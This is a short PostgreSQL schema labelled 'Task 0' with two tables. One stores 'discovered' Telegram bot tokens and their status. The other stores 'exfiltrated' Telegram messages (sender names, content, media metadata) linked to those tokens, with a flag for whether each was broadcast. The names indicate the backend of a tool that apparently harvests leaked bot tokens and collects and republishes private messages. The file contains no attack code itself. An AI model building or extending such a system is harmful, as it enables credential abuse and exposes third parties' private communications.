-- Task 0: SQL Schema

-- Table: discovered_credentials
CREATE TABLE IF NOT EXISTS discovered_credentials (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    bot_token TEXT NOT NULL, -- Will store Encrypted String
    token_hash TEXT NOT NULL UNIQUE, -- SHA256 hash for deduplication
    chat_id BIGINT,
    source TEXT,
    status TEXT CHECK (status IN ('pending', 'active', 'revoked')) DEFAULT 'pending',
    meta JSONB DEFAULT '{}'::jsonb,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- Index for bot_token (not useful for searching if encrypted, but good for uniqueness if we used a hash, 
-- but here we might just query by ID or scan. Adding index on status is useful).
CREATE INDEX IF NOT EXISTS idx_creds_status ON discovered_credentials(status);


-- Table: exfiltrated_messages
CREATE TABLE IF NOT EXISTS exfiltrated_messages (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    credential_id UUID REFERENCES discovered_credentials(id) ON DELETE CASCADE,
    telegram_msg_id INT NOT NULL,
    sender_name TEXT,
    content TEXT,
    media_type TEXT DEFAULT 'text',
    file_meta JSONB DEFAULT '{}'::jsonb,
    is_broadcasted BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Indexes
CREATE INDEX IF NOT EXISTS idx_messages_credential_id ON exfiltrated_messages(credential_id);
CREATE INDEX IF NOT EXISTS idx_messages_is_broadcasted ON exfiltrated_messages(is_broadcasted) WHERE is_broadcasted = FALSE;
-- Unique constraint to prevent duplicate messages per credential
ALTER TABLE exfiltrated_messages DROP CONSTRAINT IF EXISTS unique_msg_per_credential;
ALTER TABLE exfiltrated_messages ADD CONSTRAINT unique_msg_per_credential UNIQUE (credential_id, telegram_msg_id);
